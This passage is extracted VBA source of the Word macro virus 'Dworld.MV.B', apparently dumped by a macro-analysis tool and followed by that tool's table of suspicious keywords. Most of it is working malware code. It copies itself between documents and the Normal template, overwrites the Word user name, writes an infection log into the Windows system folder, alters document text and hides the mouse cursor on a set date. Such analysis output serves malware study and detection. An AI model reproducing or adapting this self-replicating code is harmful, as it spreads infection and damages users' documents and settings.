  Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
     With Selection.Find
        .Text = "der"
        .Replacement.Text = "der ~[m@G]~"
        .Wrap = wdFindContinue
     End With
    Selection.Find.Execute Replace:=wdReplaceAll
Else
End If

ActiveDocument.SaveAs (WordBasic.[FileName$]())

End Sub
Sub PayloadB()
On Error GoTo weiter_

    If Day(Now()) = 12 Then
       MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"
       GoTo HideMouse
    Else
       GoTo ShowMouse
    End If

HideMouse:
 While ShowCursor(False) >= 0
 Wend
GoTo weiter_

ShowMouse:
 While ShowCursor(True) < 0
 Wend

weiter_:
End Sub
Sub HilfeInfo()
On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "<------------------------------------------------------------>                  " _
 & vbCrLf & "     Dwørld.MV.B hat Kontrolle über Word!" _
 & vbCrLf & Chr(13) + Chr(13) + "  Programmiert von RinCeWinD ~[m@G]~" _
 & vbCrLf & "              DanKe aN: IarRaGØn<***>" _
 & vbCrLf & "<------------------------------------------------------------>                  ", 64, "                     Die m@gische Gilde ~[m@G]~"
 
End Sub

Sub InfNormal()
 
If DworldIns = 0 Then
 
 DN$ = WordBasic.[FileName$]()
 DW$ = ":Dworld"
 G$ = "Global"

 On Error GoTo fehler_

 ScreenUpdating = 0

 WordBasic.MacroCopy DN$ + DW$, G$ + DW$, 1
 
 ScreenUpdating = 1
 
 Application.UserName = "RinCeWinD~[m@G]~"
 Application.UserInitials = "~[m@G]~"
 Application.UserAddress = "Kontakt: rincewind_mg@hotmail.com"

    Open "C:\WINDOWS\SYSTEM\DWORLD.INI" For Output As 1
     a$ = Date$
     b$ = Time$
     c$ = WordBasic.[FileName$]()
     
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "Erstinfektion mit Dworld.MV.B am: " + a$ + " um " + b$ + " durch " + c$
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "Programmiert von RinCeWinD~[m@G]~ aka zWeiBLuM<BeTa>"
      Print #1, "Kontakt: Rincewind_mg@hotmail.com"
      Print #1, " ---------------------------------------------------"
      Print #1, "|Danke an LzØ (besonders IarRagøN & LRay), BeTa CreW|"
      Print #1, "|und alle die mich kennen!                          |"
      Print #1, "|FöRDERT EURE LOKALE SZENE!                         |"
      Print #1, " ---------------------------------------------------"
      Print #1, ""
      Print #1, "Weitere Infektionen:"
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "DateiName:         Datum:          Uhrzeit:"
 
    Close 1
 
End If
fehler_:
End Sub
Sub InfDok()
 
If xDworldIns = 0 Then
 
 DN$ = WordBasic.[FileName$]()
 DW$ = ":Dworld"
 G$ = "Global"

On Error GoTo xfehler_

 ScreenUpdating = 0

 WordBasic.MacroCopy G$ + DW$, DN$ + DW$, 1
 
 ScreenUpdating = 1

 Call DworldInfo

End If

xfehler_:
End Sub

Function DworldIns()
 DworldIns = 0
  MZ = NormalTemplate.VBProject.VBComponents.Count
  For i = 1 To MZ
   If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Dworld" Then
     DworldIns = -1
  End If
 Next i
End Function

Function xDworldIns()
xDworldIns = 0
 xMZ = ActiveDocument.VBProject.VBComponents.Count
 For x = 1 To xMZ
  If ActiveDocument.VBProject.VBComponents.Item(x).Name = "Dworld" Then
    xDworldIns = -1
  End If
 Next x
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

